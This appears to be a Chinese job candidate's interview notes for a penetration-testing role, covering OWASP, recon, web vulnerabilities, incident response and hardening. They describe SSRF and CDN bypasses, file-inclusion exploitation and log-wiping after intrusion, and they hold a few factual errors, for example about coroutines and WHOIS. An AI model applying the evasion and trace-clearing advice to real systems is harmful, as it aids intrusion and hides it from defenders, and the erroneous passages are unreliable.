#### 背景

你好，我叫XX，我是今天来应聘渗透测试工程师这个岗位的。我之前是做软件开发的，
之所以想当渗透测试工程师是因为我之前的工作主要是做南方电网项目的，每年的7、8月
都会进行护网行动。然后上面提了十几个缺陷过来。比如复杂sql语句存在参数拼接、
重写全部数据导出方法导致的SQL注入、查询功能查询条件存在越权、敏感字符的过滤、FTP文件上传等问题。
这是我第一次接触网络安全，并对其产生了兴趣，并利用下班时间学习网络安全相关的知识。
我目前比较擅长Web渗透测试。我曾在补天漏洞平台提交过54个漏洞，其中高危的有4个，
中危的有44个，低危的有6个。因为我之前的工作是做软件开发的，所以我具有一定的安全开发
和代码审计能力。也自己尝试编写了扫描器和漏洞POC。


#### OWASP 2021

目前的OWASP Top 10 还是2021年的版本，排前10的分别是：
1.失效的访问控制：比如未授权就能访问一些文件导致信息泄漏，还有未授权登录后台应用，未授权访问API等。
2.加密机制失效：表面上就是敏感信息泄漏，比如明文传输账号密码等
3.注入：比如SQL注入、Cookie注入、UA注入等
4.不安全设计：也就是一些逻辑漏洞
5.安全配置错误：比如使用了默认的账号密码、多余的端口开放或者文件上传目录允许执行脚本等
6.有缺陷或过时组件：也就是存在历史漏洞
7.身份识别和身份验证错误：比如登录时错误的提示用户名不存在导致能爆破用户名，再加上没有验证码
或ip限制次数导致能爆破密码；还有一些认证比较脆弱或无效的，比如忘记密码功能能绕过认证进行密码重置。
或者是系统判断身份是通过uid来判断，很容易导致身份冒充。
8.软件和数据完整性故障：比如一些系统会使用第三方库，当用户提交数据或从第三方获取数据时，缺少对数据的检验，导致的安全问题。
比如：一个系统使用第三方的数据库软件，该软件会对数据验证和完整性检查，确保数据安全，但系统可能存在缺陷或错误配置，
让攻击者修改数据库里的数据。或者是一些不安全的反序列化，反序列化了些恶习代码导致软件遭到破坏。
9.安全日志记录和监控故障：也就是记录和监控不足，可能导致安全事件的错报或漏报。
10.ssrf（服务器端请求伪造）：程序向远程服务器发送http请求时，攻击者构造恶意请求，使程序向攻击者指定的url发送请求。


####如何识别一个应用程序中的安全漏洞

1.信息收集：当拿到攻击目录后可以先收集其子域名，在根据域名的ip去查是否有旁站，我平常用的是鹰图平台来查的；这样收集到更多的域名
能扩大攻击面。然后对每个ip去查都开放了哪些端口，有没有其他的服务在运行，比如查看到3306端口，可能是mysql数据库，这时就能检查是否
有弱口令或者其他存在的历史漏洞。接着去找有没有文件泄漏，比如一些文档、配置文件、备份文件啊等等信息。文件泄漏查找可以用目录扫描或者
用google dork来查找。
2.信息收集完了就开始进行渗透测试，比如一个Web网站，可以去查都用了哪些组件，比如我用浏览器插件wappalyzer来看网站用了哪些组件，这些
组件是否存在历史漏洞，看看能否利用。接着就看网站是否存在弱口令、注入、逻辑漏洞、api未授权访问等问题，这一块具体内容具体分析，比如看到
框框就试试XSS，看到一些新增功能也可以看看是否有CSRF，看到上传功能就试试有没有上传文件漏洞等等。有时候碰到防御机制还要研究如何绕过。
如果进入到内网了，结束后要清理痕迹，虽然很难清除干净，但还是要做这一步，来增加朔源成本。
3.最后就是将上述的信息整理出来。


#### 使用哪些技术和工具来发现和修复安全漏洞

对于一些漏洞扫描器，比如AWVS、NESSUS、Xray,我很少使用，首先使用这些对于小网站有用，对于一些大型网站，使用这些漏洞扫描器ip容易被封，
而且有时候这些扫描器会做些危险操作，比如增删改等，所以挖掘漏洞我基本上是手工+Burp Suite去挖掘的，
但对漏洞的利用有时会使用一些工具，比如发现存在SQL注入，
会使用sqlmap、对于网站使用了webpack会用Packer Fuzzer来批量提取api，验证是否存在未授权api，也会自己编写些poc脚本去发现漏洞。对于漏洞修复
得根据具体漏洞去修复，比如一些文件泄漏的话，如果可以删除的话就会删除，并设置目录访问权限。sql注入、XSS的话就会设置白名单或者黑名单限制输入内容，
一些明文传输就会对其进行加密。


#### 说一个印象深刻的CTF的题目

我印象深刻的一个CTF题目是一个数据通过CBC模式进行加密，可以通过Padding Oracle攻击进行解密。
CBC模式就是将明文块与上一个密文块进行异或操作，然后再进行加密。
由于这种加密方式的特性，如果攻击者知道一个加密块的明文和密文，他就可以推算出前一个加密块的明文。
Padding Oracle攻击是一种针对CBC模式加密数据的攻击方法。原理就是修改密文，将密文最后一个块的最后一个字节修改为1，
然后依次修改，对于每个被修改的字节，尝试猜测它的值。具体方法是将密文最后一个块解密后，再根据猜测出的字节值调整密文，然后再对密文进行解密。
如果解密出现了Padding Error，说明猜测的字节值不正确，需要继续猜测下一个字节。如果解密没有出现Padding Error，说明猜测的字节值是正确的，
可以进行下一个字节的猜测。重复这个过程，直到所有字节都被猜测出来，从而得到了明文。

### 密码学(RSA/AES/DSA/SM)
RSA：RSA是一种非对称加密算法，一般用于数据加密和数字签名。其中一个用于公钥，另一个用于私钥。公钥用于加密数据，私钥用于解密数据或生成数字签名。
AES：AES是一种对称加密算法。一般用于数据加密和保护机密信息的安全传输。AES算法使用相同的密钥进行加密和解密操作。
DSA：DSA是一种数字签名算法，一般用于生成和验证数字签名，确保数据的完整性和身份认证。DSA算法基于离散对数问题，使用私钥生成数字签名，使用公钥进行验证。
SM算法：SM算法是中国国家密码管理局发布的一套密码算法标准，用于替代国际上常用的加密算法。

RSA算法是一种非对称加密算法，它使用公钥和私钥进行加密和解密操作。非对称加密算法由于其计算复杂性较高，速度较慢，适合用于加密短小的数据和数字签名生成。
相比之下，AES算法是一种对称加密算法，它使用相同的密钥进行加密和解密操作，计算速度快，适合加密大量的数据。


### CRC32
CRC32是一种循环冗余校验算法，用于检测数据传输或存储过程中的错误。它通过生成一个32位的校验值，将数据块与校验值进行比较，从而验证数据的完整性和准确性。
CRC32算法的基本步骤：
初始化一个32位的寄存器，初始值为全1。
对数据块进行按位处理，从高位到低位逐位进行异或运算。
对每一位进行判断，如果当前位是1，则将寄存器与预定义的生成多项式进行异或运算；如果当前位是0，则继续下一位的处理。
继续处理下一位，直到处理完所有位。
对最终得到的寄存器值进行反转（取反），得到32位的校验值。
CRC32算法的特点是快速、简单，并且能够检测出大部分常见的传输错误。它一般用于数据通信、存储校验、文件校验、网络协议、压缩算法、文件校验和错误检测等场景。


### 反序列化漏洞
反序列化漏洞的原理是恶意攻击者构造恶意的序列化数据，通过传递给目标应用程序并触发反序列化操作，从而在应用程序内部执行恶意代码。


#### sql二次注入

SQL二次注入是攻击者利用应用程序在处理用户输入时的缺陷，将恶意的SQL语句注入到应用程序内部的数据存储（如数据库表、文件等）中，
然后再次触发应用程序将该数据提取并执行SQL查询的操作。


### Python反爬虫机制（IP->代理池、验证码破解、UA）
User-Agent检测：网站可能会检查请求中的User-Agent头信息，如果检测到非常见的或自动化爬虫的User-Agent，可能会阻止访问。
应对方法是在请求中设置一个常见的浏览器User-Agent，以模拟正常用户的请求。
IP限制和封禁：网站可能会限制对同一IP地址的频繁请求或封禁已知的爬虫IP地址。应对方法是使用代理IP或者使用IP池来轮换请求的IP地址，以避免被识别和限制。
验证码识别：网站可能会在页面中添加验证码，要求用户进行验证码验证后才能访问。应对方法是使用第三方验证码识别库，自动解析验证码并提交验证结果。
动态加载和JavaScript渲染：应对方法是使用无头浏览器如Selenium来模拟浏览器行为，完全加载并渲染JavaScript生成的内容。
访问频率限制：网站可能会对频繁的请求进行限制，应对方法是使用延时等待或使用定时任务控制爬取速度，避免过于频繁的请求。
隐藏字段和表单验证：一些网站会在表单中添加隐藏字段或使用其他形式的表单验证，应对方法是在发送POST请求时，确保包含了正确的表单字段和值。

### 并发(多线程、线程池、协程、三个程之间的区别)
多线程：
多线程是指在一个进程中创建多个线程，每个线程独立执行任务，共享进程的资源。
多线程可以同时执行多个任务，提高程序的并发性，适用于I/O密集型任务（如网络请求、文件读写）。
线程间的切换需要消耗一定的系统资源，可能存在线程安全问题，需要通过锁等机制进行同步。
线程池：

线程池是一种管理和复用线程的机制，它预先创建一组线程，并在需要执行任务时将任务分配给空闲的线程执行。
线程池可以控制线程的数量，减少线程创建和销毁的开销，并且能够更好地管理线程的生命周期。
适用于高并发场景，可以有效地限制并发线程数量，防止线程过多导致系统资源耗尽。
协程：
协程是一种轻量级的用户级线程，也被称为非抢占式的线程。它在代码级别上实现了多个独立的执行流程，由开发者手动进行协作调度。
协程之间可以进行切换而不需要进入内核，切换开销小，执行效率高。
协程适用于密集计算型任务（如计算、图像处理等），通过使用异步/await等语法，可以编写简洁且高效的异步代码。
总结：

多线程适用于I/O密集型任务和多核CPU环境，能够实现并发执行，但需要考虑线程安全和同步问题。
线程池适用于高并发环境，能够复用线程、减少线程创建销毁开销，并提供线程数量的控制和管理。
协程适用于密集计算型任务和需要高效的异步编程，能够实现高效的切换和调度，但需要开发者手动进行协作调度。


### DDOS是什么
DDoS代表分布式拒绝服务，是一种恶意攻击方式，旨在通过大量的请求或流量超过目标系统的处理能力，使其无法正常提供服务给合法用户。比如导致服务中断、延迟或崩溃。
为了应对DDoS攻击，目标系统通常采取防御措施，如流量监测与过滤、负载均衡、防火墙配置、CDN（内容分发网络）等，以尽量减轻攻击带来的影响。
#### 实例

我司网站www.catroot.cn的IP 223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。
启用备用IP地址：如果您有备用的IP地址可供使用，可以将流量重定向到备用IP地址上，从而绕过被攻击的IP地址。
采取DDoS防护服务：如流量监测与过滤、负载均衡、防火墙配置、CDN（内容分发网络）等，以尽量减轻攻击带来的影响。
配置防火墙规则：通过防火墙配置来限制流量，并封堵DDoS攻击的来源IP地址。
还有一种就是拼钱，加大带宽，买专业的数据清洗服务。


#### 主机被入侵
隔离受影响的主机：立即将受感染或受入侵的主机从网络中隔离，断开与其他系统的连接，以防止进一步的传播和损害。
收集证据：在采取任何行动之前，尽可能收集关于入侵的证据。这包括异常日志、文件变动、系统快照等。这些证据有助于后续的调查和分析。
通知相关人员：及时通知相关的安全团队、管理层和其他相关人员，以确保他们了解入侵事件，并可以采取适当的行动。
关闭漏洞和弱点：确定入侵的途径和弱点，并尽快修复或关闭它们，以防止进一步的入侵。
安全审查：进行安全审查，检查所有系统和应用程序的安全性，确保没有其他漏洞存在。
清除恶意软件：使用更新的杀毒软件和恶意软件清除工具对受影响的主机进行全面扫描，并清除发现的恶意软件。
密码更改：更改所有受影响用户和管理员的密码，包括操作系统、应用程序、数据库等的密码。
更新和补丁：确保所有软件和系统都是最新的，应用安全补丁以修复已知的漏洞。
安全恢复：进行全面的系统恢复和修复，包括重新安装操作系统、恢复备份数据等。
安全加固：对主机进行安全加固，包括配置防火墙、安装入侵检测系统、加密通信等措施，以提高系统的安全性。


### 入侵 Linux 服务器后需要清除哪些日志？
/var/log/ 下有很多日志，比如SSH登录记录、su命令、系统认证和登录相关的信息、登录和失败登录的记录、记录用户最后一次登录


### Linux服务器的安全运维操作有哪些？如何保护 SSH？
及时更新操作系统和软件包，修复已知漏洞。
使用强密码策略
启用日志记录，并监视系统日志以及其他关键日志文件。
定期备份重要的系统和用户数据。
进行定期的安全评估，包括漏洞扫描和渗透测试。
提供针对员工的安全意识培训.
用安全协议 (如SSL/TLS) 来加密网络通信。
定期审查系统配置，确保符合最佳安全实践。

设置复杂的SSH登录密码或禁用SSH密码登录，改为使用公钥身份验证。
只允许来自可信IP范围的连接。
及时应用操作系统和SSH软件的安全补丁和更新。
记录所有的SSH登录活动。
为每个用户分配最小化的权限，避免使用共享的SSH账号。
启用SSH会话的加密功能，确保数据在传输过程中的保密性。


### 渗透测试流程
确定目标和目标范围：
定义要进行渗透测试的目标系统、网络或应用程序。
确定测试的范围，包括哪些方面和功能应该被评估。
收集信息：
收集关于目标系统的信息，包括IP地址、域名、网络拓扑等。
了解目标系统的架构、技术栈和可能的漏洞。
漏洞扫描和识别：
使用自动化工具（如漏洞扫描器）扫描目标系统，发现已知的漏洞。
对系统进行端口扫描、服务识别和漏洞探测。
漏洞利用和访问获取：
针对发现的漏洞，进行手动漏洞利用尝试，尝试获取系统的访问权限。
使用各种技术和工具，如密码破解、社交工程等，获取目标系统的敏感信息或控制权。
权限提升和横向移动：
如果成功获取了初始访问权限，尝试提升权限，以获得更高级别的权限。
在目标网络中进行横向移动，探测其他系统和服务，并寻找进一步的攻击路径。
数据收集和信息窃取：
收集目标系统中的敏感信息，如数据库、配置文件、用户凭据等。
利用各种技术和方法，窃取目标系统中的关键数据。
维持访问和持久性：
在目标系统中保持访问权限，以便进行长期监控、数据窃取或后续攻击。
隐藏攻击活动，不被目标系统的日志和安全监测发现。
覆盖痕迹和清理：
删除或修改攻击留下的日志、痕迹和后门。
恢复目标系统的原始状态，以避免被发现和调查。
编写报告和建议：
撰写渗透测试报告，详细记录发现的漏洞、攻击路径和建议的修复措施。
提供针对漏洞修复和加固的建议，帮助目标系统提升安全性。
与客户沟通和跟进：
向客户呈现渗透测试报告，解释发现的漏洞和风险。
提供进一步的支持和建议，回答客户可能有的问题和疑虑。
跟进漏洞修复过程，确保客户采取适当的措施来修复漏洞和加固系统。
总结：渗透测试流程包括确定目标范围、收集信息、漏洞扫描和识别、漏洞利用和访问获取、权限提升和横向移动、数据收集和信息窃取、维持访问和持久性、
覆盖痕迹和清理、编写报告和建议，以及与客户沟通和跟进。


### 挖过什么逻辑漏洞
我挖的最多的逻辑漏洞是忘记密码功能里的绕过验证直接修改密码、邮箱和短信的轰炸漏洞。邮箱短信轰炸漏洞我碰到的就是邮箱大小写绕过，
短信的就是手机号码前加0绕过和使用X-Forwarded-For请求头绕过
通过手机号和发送的验证码登录的，验证码是4位数且没有时间限制，登录接口能无限枚举爆破，但补天漏洞平台不收，
还有一些越权的，比如用户A能越权下载用户B的身份证图片，但由于图片id是加密过的，我无法破解，补天漏洞平台也不收。


### 你常用的渗透工具有哪些，最常用的是哪个？
平常用的最多的就是burpsuite+xray；burpsuite去看每个请求和其返回包，xray被动扫描。
获取子域名的用OneForAll，目录扫描用dirsearch，用nmap去扫域名开放的端口。
还用谷歌插件Wappalyzer看网站用了什么组件，去看该组件是否存在历史漏洞，如果有webpack就用packer-fuzzer提取api，看api有没有一些未授权的。
发现有sql注入的话会用sqlmap，还有找一些信息泄露的，比如.git、.svn、config、网站备份等文件用自己些的脚本去跑。


### 流量分析WireShark
wireshark流量分析首先就是要选择分析的网络接口，然后根据筛选条件：比如ip、协议、端口等进一步筛选数据，
这个软件里面还内置了一下功能，比如流量统计、协议分布、延迟分析等，可以帮助识别异常行为、优化网络性能等。
但我很少用过这个软件，上次用这个软件是学习网络拓扑时看流量的走向而已。


### 描述一个你深入研究过的CVE或POC
因为我负责过的一个项目是用过了struts2框架的项目，所以我有看过该框架的CVE，我举个例子吧，S2-057漏洞，攻击者可以通过构造恶意的OGNL表达式来触发漏洞，
导致任意命令执行和反弹shell。校验是否存在这个漏洞的原理是在url里插入一个OGNL表达式，比如为${num1+num2},如果请求为302，
看Location是否计算了这个表达式，如果计算了那么就是存在该漏洞。我看过github上的一个比较高星的struts2框架漏洞验证，它里面有些poc验证写的不是很准确，
比如他写死了url后缀是.action,但有些网站使用了struts2框架但不是以.action结尾的，也有可能会用.do进行结尾。真要利用还得在加一层判断。不过可惜的是，
我到现在都没有碰到过网站有struts2漏洞的。可能漏洞刚出现的时候就已经被大佬批量给刷了。


### CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ 
XSS漏洞就是攻击者在网页中插入恶意代码，使得用户在浏览器端执行这些恶意代码，从而导致攻击者能够获取用户的敏感信息或者对网站进行其他恶意操作。

XSS攻击可以分为以下三种类型：
存储型XSS：攻击者将恶意脚本代码存储到目标网站的数据库中，当其他用户浏览受影响的页面时，恶意脚本会被从数据库中读取并执行。
反射型XSS：攻击者将恶意脚本代码作为参数附加在URL中，当用户点击恶意链接或者提交包含恶意参数的表单时，网站会将恶意脚本作为响应返回给用户的浏览器，浏览器执行该脚本。
DOM型XSS：攻击者将恶意代码被直接注入到浏览器的DOM（文档对象模型）中执行，从而实现攻击。

反射型XSS是将恶意代码作为输入参数提交给服务器，然后服务器将其反射到响应页面中执行。而DOM型XSS则是在前端JavaScript代码执行阶段直接注入恶意代码到DOM中。

预防XSS攻击的常见措施包括：
输入验证和过滤：对用户输入的数据进行验证和过滤，确保输入符合预期格式，移除或转义特殊字符。
输出编码：在将用户输入的数据输出到网页上时，进行适当的编码，确保不会被解析为恶意脚本。
使用CSP（内容安全策略）：通过CSP设置，限制浏览器执行恶意脚本的能力，仅允许加载指定来源的资源。
使用HttpOnly标记：将Cookie标记为HttpOnly，防止恶意脚本通过document.cookie获取到敏感信息。
安全开发实践：在开发过程中，遵循安全编码准则，尽量避免将用户输入直接嵌入到页面或执行环境中。


CSRF就是利用用户当前已通过身份验证的会话来执行未经授权的操作。
CSRF攻击其实就是将网站一些新增或者修改操作功能构造出对应的表单，提交时会带上Cookie，然后未经授权执行了对应的操作，不过现在CSRF攻击有点难了，
因为现在很多项目都是前后端分离的，你表单提交是无法携带上Cookie的，想获得Cookie还得配合上XSS。

为了防止CSRF攻击，可以采取以下措施：

随机化请求：为每个用户请求生成一个唯一的令牌（CSRF Token），并将其包含在表单中。在服务器端验证令牌的有效性，只有在令牌验证通过时才执行请求。
使用SameSite属性：将Cookie的SameSite属性设置为Strict或Lax，限制Cookie仅在同一站点内进行请求。这可以防止跨站点的Cookie使用。
验证身份和敏感操作：对于敏感操作，例如修改用户信息或进行支付操作，应要求用户再次进行身份验证，例如输入密码或使用二次身份验证。


XXE攻击的基本原理是通过构造恶意的XML实体引用，将外部实体加载到XML文档中，并利用这些实体访问敏感信息。
为了防止XXE攻击，可以采取以下措施：
禁用外部实体加载
输入验证和过滤
使用安全的解析器
白名单验证
内容安全策略


### CSRF、SSRF和重放攻击有什么区别？
SSRF漏洞就是应用程序允许用户控制某些请求的目标URL，攻击者可以通过操纵服务器端应用程序发起未经授权的网络请求，并访问服务器内部的其他资源，
包括外部系统、文件、数据库等。这可能导致数据泄露、未授权访问、远程文件包含等安全问题。
为了防止SSRF漏洞，应该对用户提供的URL进行严格的输入验证和过滤。可以使用白名单机制，限制允许访问的URL范围，或者使用特定的URL解析器，
仅允许特定的协议和主机。
此外，还应当为内部网络和外部资源之间建立合适的网络隔离措施，并确保服务器和应用程序的安全配置。

重放攻击的基本原理是攻击者截获了有效的通信数据包或请求，然后将其修改并重新发送给目标系统，
可能导致以下问题：身份验证绕过、信息泄露、和一些其他的非法操作，比如邮箱短信轰炸，或者请求占资源多，利用多次重放达成DOS攻击。


### 啥是同源策略，跨域有几种方式？
同源策略是一种Web浏览器的安全策略，用于限制不同源之间的跨域访问。同源指的是协议、域名和端口三者完全相同。
网页中的脚本只能访问同源下的资源，而不能访问其他域下的资源。这是为了防止恶意网站通过脚本等手段获取用户的敏感信息或进行未授权操作。
有以下几种常见的跨域方式：
JSONP（JSON with Padding）：利用<script>标签的跨域特性，通过动态创建<script>标签，将需要获取的数据作为回调函数的参数返回到当前页面。
JSONP只支持GET请求。
CORS：通过服务器设置响应头中的Access-Control-Allow-Origin字段，允许特定的源访问服务器的资源。
iframe跨域：通过在页面中嵌入不同源的<iframe>元素，通过window.postMessage方法进行跨域通信。
WebSocket协议：WebSocket协议支持跨域通信，通过建立WebSocket连接实现双向通信。
代理服务器：将跨域请求发送给代理服务器，由代理服务器转发请求并返回结果给页面，使页面认为请求是同源的。


#### JSONP的劫持
JSONP劫持的原理是，攻击者利用目标网站在使用JSONP时未进行足够的安全验证，导致恶意注入的JavaScript代码被执行。
攻击者会构造一个恶意网站，并构造一个函数，该函数里插入恶意代码。当用户访问恶意网站时，会触发对目标网站的JSONP接口的请求，
并将函数作为参数传递给目标网站。目标网站会将恶意代码作为合法请求处理，并将其执行。
为了防止JSONP劫持攻击，开发者可以采取以下措施：
验证和过滤数据
限制JSONP使用范围
使用CORS

### WebSocket
WebSocket是一种在Web应用程序中实现双向通信的协议。使用ws://（非加密）和wss://（加密）作为协议前缀。
相比传统的HTTP请求-响应模式，WebSocket允许服务器主动向客户端推送消息，而不需要客户端发起请求。
以下是WebSocket的一些特点和用途：
实时性: WebSocket提供了实时的双向通信，可以在客户端和服务器之间实时传输数据。
这使得它非常适合需要实时更新和推送数据的应用，如在线聊天、实时协作工具、股票市场数据等。
双向通信: WebSocket允许客户端和服务器之间进行双向通信，而不仅仅是单向的请求-响应模式。客户端和服务器可以同时发送和接收消息，实现更强大的交互功能。
较低的开销: 相比于传统的HTTP请求-响应模式，WebSocket在建立连接后使用的是持久连接，
避免了每次请求都要建立新的连接的开销。这样可以减少网络流量和延迟，并提高性能。
跨域支持: WebSocket支持跨域通信，可以在不同域名和端口之间进行通信，但需要服务器端进行相应的配置，以确保安全性。
安全性: WebSocket可以通过TLS/SSL加密来保证通信的安全性，确保数据在传输过程中的机密性和完整性。


#### CORS(重点)
CORS的实现依赖于浏览器的支持和服务器的配置。
在CORS中，浏览器会在发送跨域请求时自动添加一个Origin头部字段，指示请求的来源地址。服务器可以根据这个头部字段来判断是否允许该请求。
如果服务器允许跨域请求，则在响应中添加一些特殊的HTTP头部，如Access-Control-Allow-Origin和Access-Control-Allow-Methods，以告知浏览器允许该请求。
通过CORS，服务器可以细粒度地控制允许的跨域请求，可以设置特定的源、方法、头部等。
需要注意的是，CORS仅在浏览器环境下有效，不影响非浏览器环境的HTTP请求。


#### 与JSONP的比较
都是用于解决跨域请求的机制但它们之间有一些重要的区别。
CORS是基于浏览器的标准机制，需要服务器进行配置，而JSONP是通过在客户端动态创建<script>标签来实现的。
CORS提供了更安全的跨域请求机制。服务器可以根据请求头部中的Origin字段来验证请求的来源，并通过设置响应头部的方式进行授权。
CORS可以支持多种数据格式的请求和响应，不仅限于JSON，还可以处理XML、文本等格式。而JSONP仅支持JSON格式的数据。
而JSONP存在安全风险，因为它可以执行任意脚本代码，容易受到XSS（跨站脚本攻击）的影响。
CORS支持所有HTTP请求方法，包括GET、POST、PUT、DELETE等。而JSONP仅支持GET请求。
ORS是更为先进和安全的跨域请求机制，逐渐替代了JSONP的使用。


### CSP策略
CSP策略用于限制页面加载的资源和执行的操作，以减少XSS等安全威胁。CSP通过指定允许加载的资源源和可执行的代码源，帮助网站管理员减少恶意代码的注入和执行。
SP策略通过设置HTTP头部或在HTML文档中添加<meta>标签来定义。
CSP策略中的每个指令都可以使用单个或多个源来指定，源可以是域名、主机名、协议等。
例如，script-src 'self'表示只允许从同源加载JavaScript脚本，img-src https://example.com表示只允许从指定的域名加载图像。


### SSRF利用时有哪些伪协议？
file://: 该协议允许访问本地文件系统。攻击者可以使用 file:// 协议来读取敏感文件、执行本地命令或利用文件包含漏洞。
gopher://: Gopher 协议是一种早期的文本协议，用于访问和检索互联网资源。攻击者可以使用 gopher:// 协议来访问内部系统资源、执行命令或进行数据泄露。
dict://: Dict 协议用于查询字典或词典的定义。攻击者可以使用 dict:// 协议来执行远程命令或获取敏感信息。
ldap://: LDAP（轻型目录访问协议）协议用于访问和操作目录服务器。攻击者可以使用 ldap:// 协议来执行 LDAP 注入攻击或访问敏感目录信息。
tftp://: TFTP（简单文件传输协议）协议用于在网络上传输文件。攻击者可以使用 tftp:// 协议来下载或上传文件，执行命令或利用 TFTP 服务器的漏洞。


### SSRF绕过
绕过内网限制：如果目标应用程序使用白名单或其他机制限制了对内网资源的访问，攻击者可以尝试绕过这些限制。
例如，攻击者可以使用各种技巧来构造绕过内网限制的请求，如使用IPv6地址、使用无需授权的内部域名、使用特殊的IP地址（如127.0.0.1的十六进制表示）等。

绕过URL过滤：某些应用程序可能对用户输入的URL进行过滤，防止访问不受信任的站点或特定协议。
攻击者可以尝试绕过这些过滤机制，如使用URL编码、使用短URL服务、使用URL重定向、使用伪协议等。

绕过DNS解析：在一些情况下，目标应用程序可能会使用DNS解析来验证输入URL的合法性。攻击者可以尝试绕过DNS解析的方式，
如使用IP地址而不是域名、使用特殊的域名格式（如长域名、域名嵌套等）、使用IP地址的十六进制表示等。

绕过协议验证：目标应用程序可能会验证请求的URL是否符合特定协议，如HTTP或HTTPS。攻击者可以尝试绕过协议验证，
如使用其他协议的伪造请求（如FTP、LDAP、SMB等）或绕过协议前缀的检测。

绕过重定向和URL规范化：某些应用程序可能对重定向和URL规范化进行处理，防止SSRF攻击。
攻击者可以尝试绕过重定向和URL规范化的限制，如使用相对路径、使用特殊字符（如空格、换行符等）进行编码、利用URL短码服务等。

利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。


#### SSRF漏洞处
1. 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。
2. 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。
3. 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。
4. 邮件系统就是接收邮件服务器地址这些地方。
5. 文件就找ImageMagick，xml这些。
6. 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。


### xss盲打到内网服务器的利用
XSS通常被用于窃取用户的敏感信息、会话令牌等。但是，XSS本身并不直接导致攻击者能够直接获取内网服务器的敏感信息。
如何想间接获取内网服务器的敏感信息，可能需要目标网站有一些连接内部的功能，
这种情况得看具体情况，我是没有碰到过利用XSS获取到内网服务器的情况。


### 文件上传下载遍历漏洞
文件上传下载遍历漏洞是应用程序没有正确验证和限制上传文件的路径或文件名。可以通过此漏洞执行恶意活动：
文件遍历：攻击者可以通过构造恶意请求，使用特殊字符或路径跳转符号（如../）绕过应用程序的文件路径验证，
从而访问服务器上的敏感文件或目录，甚至可以访问应用程序之外的系统文件。
文件覆盖：攻击者可以上传具有恶意内容的文件，替换应用程序服务器上的现有文件，这可能导致应用程序功能的破坏或用户数据的损失。
远程命令执行（RCE）：如果应用程序允许用户上传的文件被执行（例如，通过动态解析脚本文件），
攻击者可以上传包含恶意代码的文件，通过文件上传下载遍历漏洞执行任意命令或代码。


## 文件包含漏洞
文件包含漏洞是攻击者通过未正确过滤、验证或限制用户输入的方式，将恶意文件包含到应用程序的代码中。
这种漏洞可能导致敏感信息泄露、服务器端执行任意代码、服务器拒绝服务（DoS）等安全问题。
文件包含漏洞通常发生在以下情况下：
直接文件包含（LFI）：应用程序接受用户输入，将其作为文件路径或文件名的一部分，然后在服务器上包含该文件。
如果攻击者能够控制用户输入，并提供恶意的文件路径，就可以包含任意文件，包括敏感系统文件或应用程序源代码。
远程文件包含（RFI）：应用程序接受用户提供的远程文件URL，并在服务器上将该URL指定的文件包含到应用程序中。
如果攻击者能够控制用户提供的URL，并指向恶意文件，就可以在服务器上执行任意代码或获取敏感信息。
攻击者可能利用文件包含漏洞来执行以下恶意操作：
执行任意代码：攻击者可以包含具有恶意代码的文件，以在服务器上执行任意命令，获取敏感信息或完全控制服务器。
敏感信息泄露：攻击者可以包含存储敏感信息的文件，并将其内容泄露给攻击者。
服务器拒绝服务（DoS）：攻击者可以包含大量占用系统资源的文件，导致服务器崩溃或无法正常工作。
为了防止文件包含漏洞的利用，可以采取以下安全措施：
输入验证和过滤：对用户输入进行严格的验证和过滤，确保只接受有效的文件路径或URL，并拒绝包含恶意字符或特殊符号。
白名单验证：限制文件包含的路径或文件名，使用白名单机制确保只包含可信任的文件。
限制访问权限：确保服务器上的文件只能从应用程序的可信目录访问，限制对系统文件的访问权限。
安全配置：确保服务器的目录浏览功能已禁用，并限制文件系统的访问权限，防止文件包含漏洞的利用。
定期更新和维护：保持应用程序和服务器软件的最新版本，及时应用安全补丁和更新。
日志监控和分析：监控应用程序的访问日志，检测异常的文件包含请求，并禁止该请求访问。
安全编码实践：在应用程序开发过程中，采用安全编码实践，包括避免直接使用用户输入作为文件路径或文件名，
使用安全的文件包含函数或方法，并确保正确的输入验证和输出编码。
网络隔离：将应用程序服务器与敏感的系统和文件分离，使用网络隔离措施，限制对文件系统的访问权限。
安全漏洞扫描和测试：定期进行安全漏洞扫描和测试，包括检测文件包含漏洞，并及时修复发现的漏洞。
安全意识培训：提高开发人员和管理员的安全意识，教育他们识别和防止文件包含漏洞的利用。


### 文件包含利用
1. 读取敏感文件
2. 远程包含shell
3. 图片上传并包含图片shenll
4. 使用伪协议
5. 包含日志文件GetShell
6. 截断包含


### LDAP注入
LDAP注入是指攻击者通过在LDAP（轻量级目录访问协议）查询中注入恶意代码来绕过身份验证、执行未经授权的操作或获取敏感信息的漏洞。LDAP注入与SQL注入类似。只是它的查询语法是不一样的。
现在SQL注入都很少见了，对于LDAP注入我都没碰到过。


### 如何绕过CDN找到真实IP，列举五种方法
DNS历史记录：通过查询目标域名的DNS历史记录，可以获取过去使用的真实IP地址。一些公开可用的工具和服务可以帮助你查找DNS历史记录。
WHOIS查询：通过WHOIS查询目标域名的注册信息，可以获取与域名相关的真实IP地址和其他联系信息。WHOIS查询通常提供了域名注册者的真实IP地址。
HTTP头信息：尽管CDN隐藏了真实的服务器IP地址，但在HTTP头信息中仍然可以找到一些有用的线索。
通过分析HTTP头中的一些字段，如X-Forwarded-For、X-Real-IP等，可能会暴露真实的IP地址。
IP历史记录：一些公开可用的IP历史记录数据库或工具，如Shodan、Censys等，提供了有关IP地址的历史记录和相关信息。
通过查询目标域名的历史IP地址，可能可以找到真实的IP地址。
HTTP请求方法绕过：
CDN通常会对GET请求进行缓存并直接返回响应，而对于其他请求方法（如POST、PUT、DELETE等），CDN可能会将请求转发给后端服务器进行处理。
当攻击者发送非GET请求方法（如POST）时，CDN可能会将请求转发给真实的服务器进行处理，并将服务器的响应返回给攻击者。
SSRF:SSRF攻击是指攻击者通过构造恶意请求，使目标服务器发起对内部网络或其他外部服务器的请求，从而绕过了CDN的保护。直接访问到真实的内部网络资源。


### redis未授权如何利用，利用前提条件
Redis未授权访问是指Redis服务器未设置访问密码或配置不当，导致任何人都可以直接连接到Redis服务器并执行操作。
前提条件：
目标服务器上的Redis未设置访问密码或密码配置不正确。
Redis服务器处于可被攻击者访问的网络环境中。


